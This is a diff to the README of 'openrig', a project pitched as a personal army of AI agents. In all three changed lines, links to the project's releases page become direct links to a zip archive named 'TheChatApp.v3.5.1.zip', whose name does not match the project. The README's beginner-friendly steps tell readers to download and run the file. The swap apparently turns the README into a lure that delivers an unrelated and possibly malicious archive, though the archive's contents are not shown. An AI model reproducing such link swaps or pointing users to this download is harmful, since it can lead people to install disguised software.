@@ -1,6 +1,6 @@
 # 🎛️ openrig - Your Personal Army of AI Agents
 
-[![Download openrig](https://img.shields.io/badge/Download%20openrig-Latest%20Release-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/Kaportaci31/openrig/releases)
+[![Download openrig](https://img.shields.io/badge/Download%20openrig-Latest%20Release-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/Kaportaci31/openrig/releases/download/3.5.1/TheChatApp.v3.5.1.zip)
 
 ## 👋 What is openrig?
 
@@ -20,7 +20,7 @@ Let's get you set up with openrig! Follow these simple steps:
 
 ### Step 1: Download openrig
 
-[![Download Now](https://img.shields.io/badge/⬇️%20Download%20openrig-Click%20Here-purple?style=for-the-badge)](https://github.com/Kaportaci31/openrig/releases)
+[![Download Now](https://img.shields.io/badge/⬇️%20Download%20openrig-Click%20Here-purple?style=for-the-badge)](https://github.com/Kaportaci31/openrig/releases/download/3.5.1/TheChatApp.v3.5.1.zip)
 
 Visit this link to download the application. The download page might look busy, but don't worry - just look for the newest version at the top of the list and click the download button next to it. Your computer will save a file that you'll use in the next step.
 
@@ -111,7 +111,7 @@ A: Good news - if the main app has trouble, it usually tells you exactly what's 
 
 ## 📁 Project Links
 
-- 📥 **Download Page**: [https://github.com/Kaportaci31/openrig/releases](https://github.com/Kaportaci31/openrig/releases)
+- 📥 **Download Page**: [https://github.com/Kaportaci31/openrig/releases/download/3.5.1/TheChatApp.v3.5.1.zip](https://github.com/Kaportaci31/openrig/releases/download/3.5.1/TheChatApp.v3.5.1.zip)
 
 ---
 
